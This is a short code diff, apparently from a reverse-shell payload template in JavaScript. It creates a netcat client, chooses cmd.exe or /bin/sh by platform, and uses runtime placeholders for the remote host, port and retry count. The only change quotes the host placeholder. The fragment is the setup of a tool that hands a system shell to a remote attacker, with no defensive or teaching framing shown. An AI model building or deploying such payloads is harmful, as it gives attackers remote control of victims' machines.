@@ -4,7 +4,7 @@ var nc = new NetcatClient()
 var cmd = process.platform === 'win32' ? 'cmd.exe' : '/bin/sh'
 
 // Marker replaced at runtime.
-var RHOST = {{rhost}}
+var RHOST = '{{rhost}}'
 var RPORT = {{rport}}
 var RETRY = {{retry}}
 
